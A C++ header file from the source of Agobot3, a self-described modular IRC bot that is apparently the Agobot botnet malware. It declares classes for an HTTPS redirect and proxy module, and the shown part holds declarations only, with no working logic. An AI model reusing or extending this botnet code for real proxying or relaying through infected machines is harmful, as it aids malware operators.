/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __REDIR_HTTPS_H__
#define __REDIR_HTTPS_H__

#include "cstring.h"
#include "redirect.h"
#include "utility.h"
#include "ssllib.h"

class CRedirectHTTPS;
class CRedirectHTTPS_Thread;

class CRedirectHTTPS_Thread : public CRedirectBase
{
public:
	CRedirectHTTPS_Thread();
	virtual void StartRedirect();
	virtual ~CRedirectHTTPS_Thread() throw() { }

	CRedirectHTTPS				*m_pRedirHTTPS;

#ifndef AGOBOT_NO_OPENSSL
	CSSLSocket					 m_csslSocket;		// The SSL socket
#endif // AGOBOT_NO_OPENSSL
	int							 m_iConnections;
	CSocket						 m_sClientSocket;
	CSocket						 m_sServerSocket;
};

class CRedirectHTTPS : public CRedirectBase
{
public:
	CRedirectHTTPS();
	virtual void StartRedirect();
	virtual ~CRedirectHTTPS() throw() { }

	void HTTPSProxy();

	bool						 m_bUseSSL;
	CSocket						 m_sListenSocket;
};

#endif // __REDIR_HTTPS_H__
